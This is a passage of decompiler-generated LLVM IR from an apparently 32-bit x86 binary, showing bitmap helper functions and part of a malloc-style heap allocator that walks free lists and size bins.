dec_label_pc_805239f:                             ; preds = %dec_label_pc_805235e, %dec_label_pc_8052347, %dec_label_pc_805231e
  br label %dec_label_pc_80523a2

dec_label_pc_80523a2:                             ; preds = %dec_label_pc_8052399, %dec_label_pc_805239f
  %storemerge = phi i32 [ -1, %dec_label_pc_805239f ], [ %v3_8052399, %dec_label_pc_8052399 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052344, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 10, 11, 7, 8, 5, 6 }
  uselistorder i32 284, { 0, 2, 3, 4, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_80523a2, { 1, 0 }
  uselistorder label %dec_label_pc_8052339.dec_label_pc_8052339_crit_edge, { 1, 0 }
}

define i32 @function_80523aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80523aa:
  %v1_80523b8 = add i32 %arg2, -1
  %v1_80523bb = urem i32 %v1_80523b8, 32
  %v2_80523bb = icmp eq i32 %v1_80523bb, 0
  %v2_80523be = udiv i32 %v1_80523b8, 32
  br i1 %v2_80523bb, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80523aa
  %v5_80523c1 = shl i32 1, %v1_80523bb
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80523aa, %bb
  %v6_80523c3 = phi i32 [ 1, %dec_label_pc_80523aa ], [ %v5_80523c1, %bb ]
  %v2_80523c3 = mul nuw nsw i32 %v2_80523be, 4
  %v3_80523c3 = add i32 %v2_80523c3, %arg1
  %v4_80523c3 = inttoptr i32 %v3_80523c3 to i32*
  %v5_80523c3 = load i32, i32* %v4_80523c3, align 4
  %v7_80523c3 = and i32 %v5_80523c3, %v6_80523c3
  %v8_80523c3 = icmp eq i32 %v7_80523c3, 0
  %v1_80523c7 = icmp eq i1 %v8_80523c3, false
  %v2_80523c7 = zext i1 %v1_80523c7 to i32
  ret i32 %v2_80523c7

; uselistorder directives
  uselistorder i32 %v1_80523bb, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80523ce(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80523ce:
  %stack_var_-4 = alloca i32, align 4
  %v0_80523ce = load i32, i32* @ebx, align 4
  store i32 %v0_80523ce, i32* %stack_var_-4, align 4
  %v1_80523dc = add i32 %arg2, -1
  %v1_80523df = urem i32 %v1_80523dc, 32
  %v2_80523df = icmp eq i32 %v1_80523df, 0
  store i32 %v1_80523df, i32* @ecx, align 4
  %v2_80523e2 = udiv i32 %v1_80523dc, 32
  store i32 %v2_80523e2, i32* @edx, align 4
  br i1 %v2_80523df, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80523ce
  %v5_80523e5 = shl i32 1, %v1_80523df
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80523ce, %bb
  %v6_80523e7 = phi i32 [ 1, %dec_label_pc_80523ce ], [ %v5_80523e5, %bb ]
  %v2_80523e7 = mul nuw nsw i32 %v2_80523e2, 4
  %v3_80523e7 = add i32 %v2_80523e7, %arg1
  %v4_80523e7 = inttoptr i32 %v3_80523e7 to i32*
  %v5_80523e7 = load i32, i32* %v4_80523e7, align 4
  %v7_80523e7 = or i32 %v5_80523e7, %v6_80523e7
  store i32 %v7_80523e7, i32* %v4_80523e7, align 4
  %v2_80523ec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80523ec, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80523e2, { 1, 0 }
  uselistorder i32 %v1_80523df, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80523ee() local_unnamed_addr {
dec_label_pc_80523ee:
  %v0_80523ee = load i32, i32* @eax, align 4
  %v6_8052401 = icmp ugt i32 %v0_80523ee, 16777215
  br i1 %v6_8052401, label %dec_label_pc_8052412, label %dec_label_pc_8052403

dec_label_pc_8052403:                             ; preds = %dec_label_pc_80523ee
  %tmp = icmp ult i32 %v0_80523ee, 256
  %v2_80523f1 = udiv i32 %v0_80523ee, 256
  %v2_8052403 = call i32 @llvm.ctlz.i32(i32 %v2_80523f1, i1 true)
  %v3_8052403 = xor i32 %v2_8052403, 31
  %v5_8052403 = select i1 %tmp, i32 95, i32 %v3_8052403
  %v1_8052406 = add nuw nsw i32 %v5_8052403, 6
  %v2_8052409 = urem i32 %v1_8052406, 32
  %v4_8052409 = icmp eq i32 %v2_8052409, 0
  br i1 %v4_8052409, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052403
  %v5_8052409 = lshr i32 %v0_80523ee, %v2_8052409
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052403, %bb
  %v0_805240b = phi i32 [ %v0_80523ee, %dec_label_pc_8052403 ], [ %v5_8052409, %bb ]
  %v1_805240b = urem i32 %v0_805240b, 4
  %v2_805240e = mul nuw nsw i32 %v5_8052403, 4
  %v3_805240e = or i32 %v1_805240b, 32
  %v4_805240e = add nuw nsw i32 %v3_805240e, %v2_805240e
  br label %dec_label_pc_8052412

dec_label_pc_8052412:                             ; preds = %dec_label_pc_80523ee, %bb4
  %v0_8052413 = phi i32 [ 95, %dec_label_pc_80523ee ], [ %v4_805240e, %bb4 ]
  ret i32 %v0_8052413

; uselistorder directives
  uselistorder i32 %v2_8052409, { 1, 0 }
  uselistorder i32 %v0_80523ee, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052412, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8052414(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052414:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052414 = load i32, i32* @ebp, align 4
  %v0_8052415 = load i32, i32* @edi, align 4
  %v0_8052416 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052429 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052429, i32* @eax, align 4
  store i32 %v2_8052429, i32* %stack_var_-92, align 4
  %v2_805242e = call i32 @function_8053940(i32 %v2_8052429, i32 134560061)
  store i32 %v2_805242e, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056080.200 to i32), i32* %stack_var_-92, align 4
  %v1_805243a = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056080.200 to i32))
  store i32 %v1_805243a, i32* %eax.global-to-local, align 4
  %v0_8052442 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8052442, -32
  br i1 %tmp124, label %dec_label_pc_8052459, label %dec_label_pc_8052447

dec_label_pc_8052447:                             ; preds = %dec_label_pc_8052414
  %v0_8052447 = load i32, i32* %stack_var_-92, align 4
  %v1_8052447 = call i32 @function_8051fb9(i32 %v0_8052447)
  store i32 %v1_8052447, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805244e = inttoptr i32 %v1_8052447 to i32*
  store i32 12, i32* %v1_805244e, align 4
  br label %dec_label_pc_8052b7e

dec_label_pc_8052459:                             ; preds = %dec_label_pc_8052414
  %v1_8052459 = add i32 %v0_8052442, 11
  %tmp125 = icmp ult i32 %v1_8052459, 16
  br i1 %tmp125, label %dec_label_pc_8052470, label %dec_label_pc_8052469

dec_label_pc_8052469:                             ; preds = %dec_label_pc_8052459
  %v1_8052469 = and i32 %v1_8052459, -8
  br label %dec_label_pc_8052470

dec_label_pc_8052470:                             ; preds = %dec_label_pc_8052459, %dec_label_pc_8052469
  %storemerge135 = phi i32 [ %v1_8052469, %dec_label_pc_8052469 ], [ %v1_8052459, %dec_label_pc_8052459 ]
  %v1_8052808 = phi i32 [ %v1_8052469, %dec_label_pc_8052469 ], [ 16, %dec_label_pc_8052459 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8052470 = load i8, i8* @global_var_8056840.201, align 1
  %v1_8052470 = sext i8 %v0_8052470 to i32
  store i32 %v1_8052470, i32* @ebx, align 4
  %v3_8052476 = urem i8 %v0_8052470, 2
  %v4_8052476 = icmp eq i8 %v3_8052476, 0
  %v1_8052479 = icmp eq i1 %v4_8052476, false
  br i1 %v1_8052479, label %dec_label_pc_8052498, label %dec_label_pc_805247b

dec_label_pc_805247b:                             ; preds = %dec_label_pc_8052470
  %v2_805247b = icmp eq i8 %v0_8052470, 0
  %v1_805247d = icmp eq i1 %v2_805247b, false
  br i1 %v1_805247d, label %dec_label_pc_8052773, label %dec_label_pc_8052483

dec_label_pc_8052483:                             ; preds = %dec_label_pc_805247b
  store i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32* %stack_var_-92, align 4
  %v2_805248b = call i32 @function_8053031(i32* bitcast (i8* @global_var_8056840.201 to i32*))
  store i32 %v2_805248b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052773

dec_label_pc_8052498:                             ; preds = %dec_label_pc_8052470
  %v11_8052498 = trunc i32 %v1_8052808 to i8
  %v8_805249c = icmp ugt i8 %v11_8052498, %v0_8052470
  br i1 %v8_805249c, label %dec_label_pc_80524b9, label %dec_label_pc_805249e

dec_label_pc_805249e:                             ; preds = %dec_label_pc_8052498
  %v2_80524a2 = udiv i32 %v1_8052808, 2
  store i32 %v2_80524a2, i32* %eax.global-to-local, align 4
  %v1_80524a4 = add i32 %v2_80524a2, ptrtoint (i8* @global_var_8056840.201 to i32)
  store i32 %v1_80524a4, i32* %ecx.global-to-local, align 4
  %v1_80524aa = add i32 %v2_80524a2, add (i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32 -4)
  %v2_80524aa = inttoptr i32 %v1_80524aa to i32*
  %v3_80524aa = load i32, i32* %v2_80524aa, align 4
  store i32 %v3_80524aa, i32* @edx, align 4
  %v1_80524ad = icmp eq i32 %v3_80524aa, 0
  br i1 %v1_80524ad, label %dec_label_pc_80524b9, label %dec_label_pc_80524b1

dec_label_pc_80524b1:                             ; preds = %dec_label_pc_805249e
  %v1_80524b1 = add i32 %v3_80524aa, 8
  %v2_80524b1 = inttoptr i32 %v1_80524b1 to i32*
  %v3_80524b1 = load i32, i32* %v2_80524b1, align 4
  store i32 %v3_80524b1, i32* %eax.global-to-local, align 4
  store i32 %v3_80524b1, i32* %v2_80524aa, align 4
  br label %dec_label_pc_80524f2

dec_label_pc_80524b9:                             ; preds = %dec_label_pc_805249e, %dec_label_pc_8052498
  %v8_80524b9 = icmp ult i32 %v1_8052808, 255
  %v6_80524c1 = icmp ugt i32 %v1_8052808, 255
  store i32 %v1_8052808, i32* @eax, align 4
  br i1 %v6_80524c1, label %dec_label_pc_80524fa, label %dec_label_pc_80524c3

dec_label_pc_80524c3:                             ; preds = %dec_label_pc_80524b9
  %v2_80524c7 = udiv i32 %v1_8052808, 8
  store i32 %v2_80524c7, i32* %eax.global-to-local, align 4
  %v1_80524ce = mul nuw i32 %v2_80524c7, 8
  %v2_80524ce = add i32 %v1_80524ce, ptrtoint (i32* @global_var_805686c.202 to i32)
  store i32 %v2_80524ce, i32* %ecx.global-to-local, align 4
  %v1_80524d5 = add i32 %v1_80524ce, add (i32 ptrtoint (i32* @global_var_805686c.202 to i32), i32 12)
  %v2_80524d5 = inttoptr i32 %v1_80524d5 to i32*
  %v3_80524d5 = load i32, i32* %v2_80524d5, align 4
  store i32 %v3_80524d5, i32* @edx, align 4
  %v12_80524d8 = icmp eq i32 %v3_80524d5, %v2_80524ce
  br i1 %v12_80524d8, label %dec_label_pc_80525f6.preheader, label %dec_label_pc_80524e0

dec_label_pc_80524e0:                             ; preds = %dec_label_pc_80524c3
  store i32 %v1_8052808, i32* %ebx.global-to-local, align 4
  %v1_80524e4 = add i32 %v3_80524d5, 12
  %v2_80524e4 = inttoptr i32 %v1_80524e4 to i32*
  %v3_80524e4 = load i32, i32* %v2_80524e4, align 4
  store i32 %v3_80524e4, i32* %eax.global-to-local, align 4
  store i32 %v3_80524e4, i32* %v2_80524d5, align 4
  %v0_80524ea = load i32, i32* @edx, align 4
  %v1_80524ea = load i32, i32* %ebx.global-to-local, align 4
  %v2_80524ea = add i32 %v0_80524ea, 4
  %v3_80524ea = add i32 %v2_80524ea, %v1_80524ea
  %v4_80524ea = inttoptr i32 %v3_80524ea to i32*
  %v5_80524ea = load i32, i32* %v4_80524ea, align 4
  %v6_80524ea = or i32 %v5_80524ea, 1
  store i32 %v6_80524ea, i32* %v4_80524ea, align 4
  %v0_80524ef = load i32, i32* %ecx.global-to-local, align 4
  %v1_80524ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80524ef = add i32 %v1_80524ef, 8
  %v3_80524ef = inttoptr i32 %v2_80524ef to i32*
  store i32 %v0_80524ef, i32* %v3_80524ef, align 4
  br label %dec_label_pc_80524f2

dec_label_pc_80524f2:                             ; preds = %dec_label_pc_805288f, %dec_label_pc_80528a1, %dec_label_pc_80524b1, %dec_label_pc_80524e0
  %v0_80524f2 = load i32, i32* @edx, align 4
  %v1_80524f2 = add i32 %v0_80524f2, 8
  store i32 %v1_80524f2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_80524fa:                             ; preds = %dec_label_pc_80524b9
  %v0_80524fe = call i32 @function_80523ee()
  store i32 %v0_80524fe, i32* %eax.global-to-local, align 4
  %v3_8052503 = and i8 %v0_8052470, 2
  %v4_8052503 = icmp eq i8 %v3_8052503, 0
  %v6_8052503 = zext i8 %v3_8052503 to i32
  %v9_8052503 = and i32 %v1_8052470, -256
  %v10_8052503 = or i32 %v9_8052503, %v6_8052503
  store i32 %v10_8052503, i32* @ebx, align 4
  br i1 %v4_8052503, label %dec_label_pc_80525f6.preheader, label %dec_label_pc_8052510

dec_label_pc_8052510:                             ; preds = %dec_label_pc_80524fa
  store i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32* %stack_var_-92, align 4
  %v2_8052518 = call i32 @function_8053031(i32* bitcast (i8* @global_var_8056840.201 to i32*))
  store i32 %v2_8052518, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525f6.preheader

dec_label_pc_80525f6.preheader:                   ; preds = %dec_label_pc_8052510, %dec_label_pc_80524c3, %dec_label_pc_80524fa
  %stack_var_-40.0.ph = phi i32 [ %v2_80524c7, %dec_label_pc_80524c3 ], [ %v0_80524fe, %dec_label_pc_8052510 ], [ %v0_80524fe, %dec_label_pc_80524fa ]
  %v0_80525f69 = load i32, i32* @global_var_8056880.205, align 128
  store i32 %v0_80525f69, i32* @ebp, align 4
  %v9_80525fc15 = icmp eq i32 %v0_80525f69, 134572148
  %v1_805260217 = icmp eq i1 %v9_80525fc15, false
  br i1 %v1_805260217, label %dec_label_pc_8052525.lr.ph, label %dec_label_pc_8052608

dec_label_pc_8052525.lr.ph:                       ; preds = %dec_label_pc_80525f6.preheader
  %v1_805254c = add i32 %v1_8052808, 16
  br label %dec_label_pc_8052525

dec_label_pc_8052525:                             ; preds = %dec_label_pc_8052525.lr.ph, %dec_label_pc_80525f6
  %v1_8052b1f = phi i32 [ %v0_80525f69, %dec_label_pc_8052525.lr.ph ], [ %v0_80525f6, %dec_label_pc_80525f6 ]
  %v1_8052525 = add i32 %v1_8052b1f, 4
  %v2_8052525 = inttoptr i32 %v1_8052525 to i32*
  %v3_8052525 = load i32, i32* %v2_8052525, align 4
  %v1_8052528 = add i32 %v1_8052b1f, 12
  %v2_8052528 = inttoptr i32 %v1_8052528 to i32*
  %v3_8052528 = load i32, i32* %v2_8052528, align 4
  store i32 %v3_8052528, i32* @edx, align 4
  %v1_805252b = and i32 %v3_8052525, -4
  store i32 %v1_805252b, i32* @edi, align 4
  br i1 %v6_80524c1, label %dec_label_pc_8052557, label %dec_label_pc_8052538

dec_label_pc_8052538:                             ; preds = %dec_label_pc_8052525
  %v9_8052538 = icmp eq i32 %v3_8052528, 134572148
  %v1_805253e = icmp eq i1 %v9_8052538, false
  br i1 %v1_805253e, label %dec_label_pc_8052557, label %dec_label_pc_8052540

dec_label_pc_8052540:                             ; preds = %dec_label_pc_8052538
  %v1_8052540 = load i32, i32* @global_var_8056870.203, align 16
  %v12_8052540 = icmp eq i32 %v1_8052b1f, %v1_8052540
  %v1_8052546 = icmp eq i1 %v12_8052540, false
  br i1 %v1_8052546, label %dec_label_pc_8052557, label %dec_label_pc_8052548

dec_label_pc_8052548:                             ; preds = %dec_label_pc_8052540
  store i32 %v1_805254c, i32* %eax.global-to-local, align 4
  %v6_8052551 = icmp ugt i32 %v1_805252b, %v1_805254c
  br i1 %v6_8052551, label %dec_label_pc_8052b08, label %dec_label_pc_8052557

dec_label_pc_8052557:                             ; preds = %dec_label_pc_8052548, %dec_label_pc_8052540, %dec_label_pc_8052538, %dec_label_pc_8052525
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %eax.global-to-local, align 4
  %v2_805255c = add i32 %v3_8052528, 8
  %v3_805255c = inttoptr i32 %v2_805255c to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v3_805255c, align 4
  %v0_805255f = load i32, i32* @edx, align 4
  store i32 %v0_805255f, i32* @global_var_8056880.205, align 4
  %v0_8052562 = load i32, i32* @edi, align 4
  %v15_8052562 = icmp eq i32 %v0_8052562, %v1_8052808
  br i1 %v15_8052562, label %dec_label_pc_8052b49, label %dec_label_pc_805256c

dec_label_pc_805256c:                             ; preds = %dec_label_pc_8052557
  %v6_8052572 = icmp ugt i32 %v0_8052562, 255
  br i1 %v6_8052572, label %dec_label_pc_8052585, label %dec_label_pc_8052574

dec_label_pc_8052574:                             ; preds = %dec_label_pc_805256c
  %v2_8052576 = udiv i32 %v0_8052562, 8
  store i32 %v2_8052576, i32* %esi.global-to-local, align 4
  %v1_8052579 = mul nuw i32 %v2_8052576, 8
  %v2_8052579 = add i32 %v1_8052579, 134572140
  store i32 %v2_8052579, i32* @ebx, align 4
  %v1_8052580 = add i32 %v1_8052579, 134572148
  %v2_8052580 = inttoptr i32 %v1_8052580 to i32*
  %v3_8052580 = load i32, i32* %v2_8052580, align 4
  store i32 %v3_8052580, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525ce

dec_label_pc_8052585:                             ; preds = %dec_label_pc_805256c
  store i32 %v0_8052562, i32* @eax, align 4
  %v0_8052587 = call i32 @function_80523ee()
  store i32 %v0_8052587, i32* %esi.global-to-local, align 4
  %v1_805258e = mul i32 %v0_8052587, 8
  %v2_805258e = add i32 %v1_805258e, ptrtoint (i32* @global_var_805686c.202 to i32)
  store i32 %v2_805258e, i32* %eax.global-to-local, align 4
  %v1_8052595 = add i32 %v1_805258e, add (i32 ptrtoint (i32* @global_var_805686c.202 to i32), i32 8)
  %v2_8052595 = inttoptr i32 %v1_8052595 to i32*
  %v3_8052595 = load i32, i32* %v2_8052595, align 4
  store i32 %v3_8052595, i32* %edx.global-to-local, align 4
  store i32 %v3_8052595, i32* @ebx, align 4
  %v12_805259e = icmp eq i32 %v3_8052595, %v2_805258e
  br i1 %v12_805259e, label %dec_label_pc_80525ce, label %dec_label_pc_80525a2

dec_label_pc_80525a2:                             ; preds = %dec_label_pc_8052585
  %v1_80525a2 = add i32 %v1_805258e, add (i32 ptrtoint (i32* @global_var_805686c.202 to i32), i32 12)
  %v2_80525a2 = inttoptr i32 %v1_80525a2 to i32*
  %v3_80525a2 = load i32, i32* %v2_80525a2, align 4
  store i32 %v3_80525a2, i32* @ebx, align 4
  %v0_80525a5 = load i32, i32* @edi, align 4
  %v2_80525a5 = add i32 %v3_80525a2, 4
  %v3_80525a5 = inttoptr i32 %v2_80525a5 to i32*
  %v4_80525a5 = load i32, i32* %v3_80525a5, align 4
  %v10_80525a5 = icmp ult i32 %v0_80525a5, %v4_80525a5
  %v1_80525a8 = icmp eq i1 %v10_80525a5, false
  br i1 %v1_80525a8, label %dec_label_pc_80525b0, label %dec_label_pc_80525ce

dec_label_pc_80525b0:                             ; preds = %dec_label_pc_80525a2
  %v1_80525b2 = or i32 %v0_80525a5, 1
  store i32 %v1_80525b2, i32* %eax.global-to-local, align 4
  store i32 %v3_8052595, i32* %ebx.global-to-local, align 4
  %v2_80525c6105 = add i32 %v3_8052595, 4
  %v3_80525c6106 = inttoptr i32 %v2_80525c6105 to i32*
  %v4_80525c6107 = load i32, i32* %v3_80525c6106, align 4
  %v10_80525c6108 = icmp ult i32 %v1_80525b2, %v4_80525c6107
  br i1 %v10_80525c6108, label %dec_label_pc_80525b7, label %dec_label_pc_80525cb

dec_label_pc_80525b7:                             ; preds = %dec_label_pc_80525b0, %dec_label_pc_80525b7
  %v0_80525cb109 = phi i32 [ %v3_80525bb, %dec_label_pc_80525b7 ], [ %v3_8052595, %dec_label_pc_80525b0 ]
  store i32 %v0_80525cb109, i32* %ecx.global-to-local, align 4
  %v1_80525bb = add i32 %v0_80525cb109, 8
  %v2_80525bb = inttoptr i32 %v1_80525bb to i32*
  %v3_80525bb = load i32, i32* %v2_80525bb, align 4
  store i32 %v3_80525bb, i32* %ecx.global-to-local, align 4
  store i32 %v3_80525bb, i32* %ebx.global-to-local, align 4
  %v2_80525c6 = add i32 %v3_80525bb, 4
  %v3_80525c6 = inttoptr i32 %v2_80525c6 to i32*
  %v4_80525c6 = load i32, i32* %v3_80525c6, align 4
  %v10_80525c6 = icmp ult i32 %v1_80525b2, %v4_80525c6
  br i1 %v10_80525c6, label %dec_label_pc_80525b7, label %dec_label_pc_80525cb

dec_label_pc_80525cb:                             ; preds = %dec_label_pc_80525b7, %dec_label_pc_80525b0
  %v0_80525cb.lcssa = phi i32 [ %v3_8052595, %dec_label_pc_80525b0 ], [ %v3_80525bb, %dec_label_pc_80525b7 ]
  %v1_80525cb = add i32 %v0_80525cb.lcssa, 12
  %v2_80525cb = inttoptr i32 %v1_80525cb to i32*
  %v3_80525cb = load i32, i32* %v2_80525cb, align 4
  store i32 %v3_80525cb, i32* @ebx, align 4
  br label %dec_label_pc_80525ce

dec_label_pc_80525ce:                             ; preds = %dec_label_pc_8052574, %dec_label_pc_80525a2, %dec_label_pc_8052585, %dec_label_pc_80525cb
  %v0_80525ce = phi i32 [ %v0_8052587, %dec_label_pc_8052585 ], [ %v0_8052587, %dec_label_pc_80525cb ], [ %v0_8052587, %dec_label_pc_80525a2 ], [ %v2_8052576, %dec_label_pc_8052574 ]
  %stack_var_-64.1 = phi i32 [ %v2_805258e, %dec_label_pc_8052585 ], [ %v0_80525cb.lcssa, %dec_label_pc_80525cb ], [ %v2_805258e, %dec_label_pc_80525a2 ], [ %v3_8052580, %dec_label_pc_8052574 ]
  %v1_80525d0 = urem i32 %v0_80525ce, 32
  %v2_80525d0 = icmp eq i32 %v1_80525d0, 0
  store i32 %v1_80525d0, i32* %esi.global-to-local, align 4
  store i32 %v1_80525d0, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80525da = sdiv i32 %v0_80525ce, 32
  store i32 %v2_80525da, i32* %edx.global-to-local, align 4
  br i1 %v2_80525d0, label %dec_label_pc_80525f6, label %bb

bb:                                               ; preds = %dec_label_pc_80525ce
  %v5_80525dd = shl i32 1, %v1_80525d0
  store i32 %v5_80525dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525f6

dec_label_pc_80525f6:                             ; preds = %dec_label_pc_80525ce, %bb
  %v5_80525df = phi i32 [ 1, %dec_label_pc_80525ce ], [ %v5_80525dd, %bb ]
  %v1_80525df = mul nsw i32 %v2_80525da, 4
  %v2_80525df = add i32 %v1_80525df, ptrtoint (i32* @global_var_8056b74.206 to i32)
  %v3_80525df = inttoptr i32 %v2_80525df to i32*
  %v4_80525df = load i32, i32* %v3_80525df, align 4
  %v6_80525df = or i32 %v4_80525df, %v5_80525df
  store i32 %v6_80525df, i32* %v3_80525df, align 4
  %v0_80525e6 = load i32, i32* @ebx, align 4
  %v1_80525e6 = load i32, i32* @ebp, align 4
  %v2_80525e6 = add i32 %v1_80525e6, 12
  %v3_80525e6 = inttoptr i32 %v2_80525e6 to i32*
  store i32 %v0_80525e6, i32* %v3_80525e6, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80525ed = load i32, i32* @ebp, align 4
  %v2_80525ed = add i32 %v1_80525ed, 8
  %v3_80525ed = inttoptr i32 %v2_80525ed to i32*
  store i32 %stack_var_-64.1, i32* %v3_80525ed, align 4
  %v0_80525f0 = load i32, i32* @ebp, align 4
  %v1_80525f0 = load i32, i32* @ebx, align 4
  %v2_80525f0 = add i32 %v1_80525f0, 8
  %v3_80525f0 = inttoptr i32 %v2_80525f0 to i32*
  store i32 %v0_80525f0, i32* %v3_80525f0, align 4
  %v0_80525f3 = load i32, i32* @ebp, align 4
  %v1_80525f3 = load i32, i32* @esi, align 4
  %v2_80525f3 = add i32 %v1_80525f3, 12
  %v3_80525f3 = inttoptr i32 %v2_80525f3 to i32*
  store i32 %v0_80525f3, i32* %v3_80525f3, align 4
  %v0_80525f6 = load i32, i32* @global_var_8056880.205, align 128
  store i32 %v0_80525f6, i32* @ebp, align 4
  %v9_80525fc = icmp eq i32 %v0_80525f6, 134572148
  %v1_8052602 = icmp eq i1 %v9_80525fc, false
  br i1 %v1_8052602, label %dec_label_pc_8052525, label %dec_label_pc_8052608

dec_label_pc_8052608:                             ; preds = %dec_label_pc_80525f6, %dec_label_pc_80525f6.preheader
  br i1 %v8_80524b9, label %dec_label_pc_8052696, label %dec_label_pc_8052616

dec_label_pc_8052616:                             ; preds = %dec_label_pc_8052608
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805261a = mul i32 %stack_var_-40.0.ph, 8
  %v2_805261a = add i32 %v1_805261a, ptrtoint (i32* @global_var_805686c.202 to i32)
  store i32 %v2_805261a, i32* %edx.global-to-local, align 4
  %v1_8052621 = add i32 %v1_805261a, add (i32 ptrtoint (i32* @global_var_805686c.202 to i32), i32 12)
  %v2_8052621 = inttoptr i32 %v1_8052621 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052621, align 4
  br label %dec_label_pc_8052692

dec_label_pc_8052626:                             ; preds = %dec_label_pc_8052692
  %v1_8052626 = add i32 %v4_805263d, 4
  %v2_8052626 = inttoptr i32 %v1_8052626 to i32*
  %v3_8052626 = load i32, i32* %v2_8052626, align 4
  store i32 %v3_8052626, i32* %ebx.global-to-local, align 4
  %v1_8052629 = add i32 %v4_805263d, 12
  %v2_8052629 = inttoptr i32 %v1_8052629 to i32*
  %v3_8052629 = load i32, i32* %v2_8052629, align 4
  store i32 %v3_8052629, i32* @ecx, align 4
  %v1_805262c = and i32 %v3_8052626, -4
  store i32 %v1_805262c, i32* @ebx, align 4
  %v10_805262f = icmp ult i32 %v1_805262c, %v1_8052808
  br i1 %v10_805262f, label %dec_label_pc_8052692, label %dec_label_pc_8052635

dec_label_pc_8052635:                             ; preds = %dec_label_pc_8052626
  %v1_8052635 = add i32 %v4_805263d, 8
  %v2_8052635 = inttoptr i32 %v1_8052635 to i32*
  %v3_8052635 = load i32, i32* %v2_8052635, align 4
  store i32 %v3_8052635, i32* @edx, align 4
  %v1_8052638 = add i32 %v3_8052635, 12
  %v2_8052638 = inttoptr i32 %v1_8052638 to i32*
  %v3_8052638 = load i32, i32* %v2_8052638, align 4
  %v15_8052638 = icmp eq i32 %v3_8052638, %v4_805263d
  %v1_805263b = icmp eq i1 %v15_8052638, false
  br i1 %v1_805263b, label %dec_label_pc_8052642, label %dec_label_pc_805263d

dec_label_pc_805263d:                             ; preds = %dec_label_pc_8052635
  %v1_805263d = add i32 %v3_8052629, 8
  %v2_805263d = inttoptr i32 %v1_805263d to i32*
  %v3_805263d = load i32, i32* %v2_805263d, align 4
  %v15_805263d = icmp eq i32 %v3_805263d, %v4_805263d
  br i1 %v15_805263d, label %dec_label_pc_8052647, label %dec_label_pc_8052642

dec_label_pc_8052642:                             ; preds = %dec_label_pc_805263d, %dec_label_pc_8052635
  %v0_8052642 = call i32 @function_8053375()
  store i32 %v0_8052642, i32* %eax.global-to-local, align 4
  %v0_8052647.pre = load i32, i32* @ebx, align 4
  %v0_805264d.pre = load i32, i32* @ecx, align 4
  %v1_805264d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052647

dec_label_pc_8052647:                             ; preds = %dec_label_pc_805263d, %dec_label_pc_8052642
  %v1_805264d = phi i32 [ %v3_8052635, %dec_label_pc_805263d ], [ %v1_805264d.pre, %dec_label_pc_8052642 ]
  %v0_805264d = phi i32 [ %v3_8052629, %dec_label_pc_805263d ], [ %v0_805264d.pre, %dec_label_pc_8052642 ]
  %v0_8052647 = phi i32 [ %v1_805262c, %dec_label_pc_805263d ], [ %v0_8052647.pre, %dec_label_pc_8052642 ]
  %v5_8052649 = sub i32 %v0_8052647, %v1_8052808
  store i32 %v5_8052649, i32* %esi.global-to-local, align 4
  %v2_805264d = add i32 %v1_805264d, 12
  %v3_805264d = inttoptr i32 %v2_805264d to i32*
  store i32 %v0_805264d, i32* %v3_805264d, align 4
  %v0_8052650 = load i32, i32* @edx, align 4
  %v1_8052650 = load i32, i32* @ecx, align 4
  %v2_8052650 = add i32 %v1_8052650, 8
